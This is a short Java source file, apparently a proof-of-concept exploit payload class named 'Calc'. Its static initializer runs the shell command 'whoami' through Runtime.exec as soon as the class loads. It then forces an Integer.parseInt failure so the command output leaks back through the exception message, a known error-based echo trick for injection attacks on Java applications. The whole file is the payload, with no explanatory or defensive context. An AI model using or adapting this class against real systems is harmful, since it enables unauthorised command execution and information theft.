import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Calc {
    static {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            String cmd = "whoami";
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        Integer.parseInt(stringBuilder.toString());
    }

    public static void main(String[] args) {

    }
}
